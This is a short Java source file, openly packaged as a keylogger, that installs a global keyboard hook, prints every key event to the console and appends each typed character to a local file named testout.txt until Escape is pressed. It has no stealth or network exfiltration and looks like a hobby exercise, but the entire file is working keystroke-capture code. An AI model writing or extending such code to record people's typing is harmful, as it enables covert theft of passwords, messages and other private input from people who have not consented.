package keylogger;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileWriter;
import java.io.PrintWriter;
import java.io.UnsupportedEncodingException;

import lc.kra.system.keyboard.GlobalKeyboardHook;
import lc.kra.system.keyboard.event.GlobalKeyAdapter;
import lc.kra.system.keyboard.event.GlobalKeyEvent;

public class keyboardlogger extends Thread implements Runnable {
	private static boolean run = true;
	
	public static void log() throws FileNotFoundException, UnsupportedEncodingException{
		// might throw a UnsatisfiedLinkError if the native library fails to load or a RuntimeException if hooking fails 
				GlobalKeyboardHook keyboardHook = new GlobalKeyboardHook();
				File testFile = new File("testout.txt");
				if(!testFile.exists()){
					
		        		System.out.println("file did not exist.  writing...");
		        		PrintWriter writer = new PrintWriter(testFile, "UTF-8");
		        	
		        		writer.close();
				}

				System.out.println("Global keyboard hook successfully started, press [escape] key to shutdown.");
				keyboardHook.addKeyListener(new GlobalKeyAdapter() {
					
						
						@Override public void keyPressed(GlobalKeyEvent event) {
							System.out.println(event);
							
							if(event.getVirtualKeyCode()==GlobalKeyEvent.VK_ESCAPE){
								run = false;
//								writer.close();
							}
							try(FileWriter fw = new FileWriter(testFile, true);
							    BufferedWriter bw = new BufferedWriter(fw);
							    PrintWriter out = new PrintWriter(bw))
							{
							    out.print(event.getKeyChar());
							    //more code
							    //more code
							} catch (Exception e) {
							    //exception handling left as an exercise for the reader
							}
						}
						@Override public void keyReleased(GlobalKeyEvent event) {
							System.out.println(event); 
							}
					
				});
				
				try {
					while(run) Thread.sleep(128);
				} catch(InterruptedException e) { /* nothing to do here */ }
				  finally { keyboardHook.shutdownHook(); }
	}
	
	public static void setRunStatus(boolean runStatus){
		
		run = runStatus;
	}
	
	public static boolean getRunStatus(){
		return run;
	}

	@Override
	public void run() {
		try {
			
			log();
		} catch (FileNotFoundException e) {
			e.printStackTrace();
		} catch (UnsupportedEncodingException e) {
			e.printStackTrace();
		}
	}
	
	
}
